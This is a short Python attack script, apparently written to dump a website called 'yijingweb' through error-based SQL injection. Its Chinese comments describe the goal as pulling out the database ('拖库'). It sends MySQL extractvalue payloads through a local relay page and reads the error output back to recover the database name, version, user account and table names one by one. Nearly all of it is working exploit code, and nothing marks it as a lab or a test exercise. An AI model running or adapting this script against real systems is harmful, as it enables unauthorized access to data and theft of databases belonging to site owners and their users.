#!/usr/bin/env python3
"""yj_dump.py - yijingweb 报错注入拖库
通过yj_out2.php逐条extractvalue提取
"""
import urllib.request, urllib.parse, ssl, re, sys, time

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {'User-Agent': 'Mozilla/5.0'}
OUT = 'http://127.0.0.1:13080/yj_out2.php'
RESULT = 'http://127.0.0.1:13080/yj_result.txt'

def probe(payload):
    """发送注入payload, 读结果文件提取错误信息"""
    url = OUT + '?id=' + urllib.parse.quote(payload)
    try:
        r = urllib.request.urlopen(urllib.request.Request(url, headers=UA), timeout=25, context=ctx)
        r.read(3000)
    except Exception:
        pass
    try:
        r2 = urllib.request.urlopen(urllib.request.Request(RESULT, headers=UA), timeout=15, context=ctx)
        body = r2.read(50000).decode('utf-8', 'ignore')
    except Exception:
        return ''
    # 提取extractvalue错误信息
    m = re.search(r"extractvalue\([^)]*\)[^<]{0,20}[\"']([^\"']+)[\"']", body)
    if m:
        return m.group(1)
    # 通用MySQL错误
    m2 = re.search(r"XPATH syntax error[^<]*|error in your SQL[^<]*", body, re.I)
    if m2:
        return m2.group(0)[:200]
    return ''

# 1. 数据库名
print('=== database() ===')
p = "687 and extractvalue(1,concat(0x7e,(select database()),0x7e))-- -"
r = probe(p)
print('DB:', r, flush=True)

# 2. 版本+用户
print('=== version/user ===')
p2 = "687 and extractvalue(1,concat(0x7e,version(),0x7e,user(),0x7e))-- -"
r2 = probe(p2)
print('VER/USER:', r2, flush=True)

# 3. 表名
print('=== 表名 ===')
for i in range(0, 8):
    p3 = "687 and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit %d,1),0x7e))-- -" % i
    r3 = probe(p3)
    print('  table[%d]: %s' % (i, r3), flush=True)
    if not r3 or 'error' in r3.lower():
        break
